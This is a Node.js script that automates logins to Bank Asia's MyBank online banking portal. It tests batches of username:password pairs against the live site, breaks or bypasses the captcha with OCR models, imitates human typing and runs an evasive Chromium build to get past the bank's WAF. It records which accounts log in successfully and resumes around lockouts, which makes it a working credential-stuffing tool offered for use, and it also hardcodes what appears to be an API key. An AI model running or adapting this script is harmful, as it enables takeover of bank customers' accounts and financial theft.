#!/usr/bin/env node
/**
 * Bank Asia MyBank login automation (mybank.bankasia-bd.com/mybank/logIn.do)
 *
 * Flow (mapped live):
 *   1. GET /mybank/logIn.do          -> JSESSIONID + F5 WAF cookies, captcha image #GSDigit1
 *   2. POST /mybank/reloadCaptcha.do -> optional fresh captcha (JSON: {CaptchaCode: <png b64>, code: <answer>})
 *   3. Mistral OCR (mistral-ocr-latest) reads the captcha image
 *   4. POST /mybank/logInSubmit.do   with userID, password, capchaText, capchaCode, errorCode, errorMessage
 *
 * Response map:
 *   errorCode=1, "Invalid User ID or Password. Sign In Denied."  -> INVALID_CREDS
 *   errorCode=1, "You entered wrong captcha code"                -> CAPTCHA_FAIL (retry w/ new image)
 *   errorCode=1, "Maximum number of login attempts..."           -> LOCKED (temp, wait)
 *   errorCode="" + URL moves off /logIn* (redirect)              -> SUCCESS
 *   HTTP 403 from F5 WAF                                         -> BLOCKED (bad IP/browser)
 *
 * Usage:
 *   node scripts/bankasia_login.mjs "userID:password"
 *   node scripts/bankasia_login.mjs --batch "u1:p1,u2:p2,..."
 *   node scripts/bankasia_login.mjs --batch /path/to/creds.txt   (one cred per line)
 *   node scripts/bankasia_login.mjs --model vision ...            (force pixtral instead of OCR model)
 *   node scripts/bankasia_login.mjs --no-ocr ...                  (skip Mistral: read embedded capchaCode)
 *   node scripts/bankasia_login.mjs --image screenshot.png        (OCR a local captcha/screenshot, print code)
 *   node scripts/bankasia_login.mjs --batch file --gap 20         (gap seconds between attempts, default 15)
 *   node scripts/bankasia_login.mjs --batch file --out /tmp/x.json (results file, default /tmp/bankasia_batch_results.json)
 *   Resumable: tested creds are written to the results file after each attempt; a restart skips
 *   INVALID_CREDS/LOCKED/SUCCESS creds, re-tries ERROR/UNKNOWN/CAPTCHA_FAIL. LOCKED creds are
 *   recorded and skipped (not retried), batch moves on. (OCR key via MISTRAL_API_KEY env or --ocr-key)
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CLOAK = '/Users/m/.cloakbrowser/chromium-145.0.7632.109.2/Chromium.app/Contents/MacOS/Chromium';
const BASE = 'https://mybank.bankasia-bd.com';
const OCR_KEY = process.env.MISTRAL_API_KEY || process.argv.find((a, i) => process.argv[i - 1] === '--ocr-key') || 'TLlIUOIuh6tcApbkjKg61iB3nj6LrwEm';

const rand = (min, max) => min + Math.random() * (max - min);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

/** OCR a captcha image (base64 png) via Mistral; returns the code string. */
async function ocrCaptcha(b64, forceVision) {
  const b64url = 'data:image/png;base64,' + b64;
  // vision path (pixtral-12b-2409) — works, read-only chat completions
  if (forceVision) return visionCode(b64url);
  // OCR path (mistral-ocr-latest)
  const resp = await fetch('https://api.mistral.ai/v1/ocr', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + OCR_KEY },
    body: JSON.stringify({ model: 'mistral-ocr-latest', document: { type: 'image_url', image_url: b64url } }),
  });
  if (!resp.ok) throw new Error('Mistral OCR HTTP ' + resp.status);
  const md = (await resp.json())?.pages?.[0]?.markdown || '';
  const code = (md.match(/[A-Za-z0-9]{5,8}/) || [])[0];
  if (!code) throw new Error('OCR returned no code: ' + md.slice(0, 80));
  return code;
}

/** Vision fallback via chat completions (pixtral). */
async function visionCode(b64url) {
  const resp = await fetch('https://api.mistral.ai/v1/chat/completions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + OCR_KEY },
    body: JSON.stringify({
      model: 'pixtral-12b-2409',
      messages: [{ role: 'user', content: [{ type: 'text', text: 'This is a captcha. Reply with ONLY the code shown.' }, { type: 'image_url', image_url: { url: b64url } }] }],
      max_tokens: 20,
    }),
  });
  if (!resp.ok) throw new Error('Mistral vision HTTP ' + resp.status);
  const content = (await resp.json())?.choices?.[0]?.message?.content;
  const code = (String(content).match(/[A-Za-z0-9]{5,8}/) || [])[0];
  if (!code) throw new Error('vision returned no code: ' + String(content).slice(0, 80));
  return code;
}

/** Type like a human: click field, wait, then keystroke-by-keystroke with jitter. */
async function typeField(page, selector, text) {
  await page.click(selector);
  await sleep(rand(150, 450));
  await page.type(selector, text, { delay: rand(20, 70) });
}

async function tryLogin(page, userID, password) {
  await page.goto(BASE + '/mybank/logIn.do', { waitUntil: 'load', timeout: 60000 });
  await sleep(rand(1800, 4000)); // human reading the page

  let code;
  if (NO_OCR) {
    // bypass: server embeds the captcha answer in the hidden capchaCode field
    code = await page.evaluate(() => document.querySelector('input[name=capchaCode]')?.value || '');
    if (!code) throw new Error('no embedded capchaCode on page');
  } else {
    const b64 = await page.evaluate(() => {
      const src = document.querySelector('#GSDigit1')?.getAttribute('src') || '';
      return src.replace(/^data:image\/[^;]+;base64,/, '');
    });
    if (!b64) throw new Error('captcha image not found on page');
    code = await ocrCaptcha(b64, FORCE_VISION);
  }

  // pause a moment between reading captcha and typing ("looking at it")
  await sleep(rand(500, 1400));
  await typeField(page, 'input[name=userID]', userID);
  await sleep(rand(200, 600));
  await typeField(page, 'input[name=password]', password);
  await sleep(rand(300, 700));
  await typeField(page, 'input[name=capchaText]', code);
  await sleep(rand(600, 2000)); // hesitate before hitting submit
  // same as doSignIn(): repoint action then submit
  await page.evaluate(() => { document.logInForm.action = '/mybank/logInSubmit.do'; document.logInForm.submit(); });
  await sleep(rand(6500, 9000)); // wait for server round-trip

  const out = await page.evaluate(() => ({
    url: location.href,
    errorCode: document.querySelector('input[name=errorCode]')?.value || '',
    errorMessage: document.querySelector('input[name=errorMessage]')?.value || '',
    bodyText: document.body.innerText.replace(/\s+/g, ' ').slice(0, 300),
  }));
  return classify(out, userID);
}

function classify(r, userID) {
  const msg = r.errorMessage.toLowerCase();
  if (msg.includes('wrong captcha')) return { status: 'CAPTCHA_FAIL', detail: r.errorMessage };
  if (msg.includes('lock') || msg.includes('maximum') || msg.includes('temporarily') || msg.includes('15 min')) return { status: 'LOCKED', detail: r.errorMessage };
  if (r.errorCode === '1' && msg.includes('invalid user id')) return { status: 'INVALID_CREDS', detail: r.errorMessage };
  if (!/\/logIn/.test(r.url) || (r.errorCode === '' && r.url.includes('.do'))) return { status: 'SUCCESS', detail: 'redirected to ' + r.url };
  return { status: 'UNKNOWN', detail: r.errorMessage || r.bodyText.slice(0, 120) };
}

// ---- main ----
const args = process.argv.slice(2);
const FORCE_VISION = args.includes('--model') && args[args.indexOf('--model') + 1] === 'vision';
const FORCE_OCR = args.includes('--model') && args[args.indexOf('--model') + 1] === 'ocr';
const NO_OCR = args.includes('--no-ocr');

// --image mode: just OCR a local image (screenshot or cropped captcha)
// vision is the reliable path here (files are often full-page screenshots)
const imgIdx = args.indexOf('--image');
if (imgIdx !== -1) {
  const b64 = fs.readFileSync(args[imgIdx + 1]).toString('base64');
  console.log('code:', await ocrCaptcha(b64, !FORCE_OCR));
  process.exit(0);
}
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.find(a => !a.startsWith('--'));
const pairs = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n').map(l => l.trim()).filter(Boolean) : (raw || '').split(',').map(s => s.trim()).filter(Boolean));
let browser = null;
const gapIdx = args.indexOf('--gap');
const GAP_BASE = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 15 : 15;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/bankasia_batch_results.json';
// resume: load previous results; definitive statuses are never re-tested
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_CREDS: 1, LOCKED: 1, SUCCESS: 1 };
for (const pair of pairs) {
  const [u, p] = pair.split(':');
  if (!u || !p) { console.log('skip bad pair:', pair); continue; }
  if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
  // fresh window per attempt: kill the previous one (stale lock modals, WAF state)
  let res;
  for (let attempt = 1; attempt <= 2; attempt++) {
    if (browser) await browser.close();
    browser = await chromium.launch({ headless: false, executablePath: CLOAK, args: ['--window-size=1440,900'] });
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
    const page = await ctx.newPage();
    try {
      res = await tryLogin(page, u, p);
      console.log(`${u} -> ${res.status} (${res.detail})`);
      if (res.status !== 'CAPTCHA_FAIL') break; // retry once with a fresh window on captcha miss
    } catch (e) {
      console.log(`${u} -> ERROR: ${e.message}`);
      res = { status: 'ERROR', detail: e.message };
      break;
    }
  }
  results[u] = res;
  fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
  if (batchIdx !== -1 && pairs.length > 1) { const gap = rand(GAP_BASE * 0.5, GAP_BASE * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
}
console.log('results saved to ' + OUT);
if (browser) await browser.close();
